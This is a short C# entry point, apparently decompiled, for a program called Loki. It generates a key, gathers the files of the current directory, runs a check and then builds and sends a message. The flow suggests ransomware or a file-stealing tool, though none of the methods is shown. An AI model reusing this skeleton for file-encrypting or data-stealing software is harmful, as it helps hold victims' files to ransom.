using System;
using System.IO;

namespace Loki;

internal class Program
{
	private static void Main(string[] args)
	{
		Loki loki = new Loki();
		Random random = new Random();
		if (random.Next(100) % 2 != 0)
		{
		}
		loki.Generatekey(1);
		loki.Populate(Directory.GetCurrentDirectory());
		if (!loki.Check())
		{
			loki.GenerateMsg();
			loki.Send();
		}
	}
}
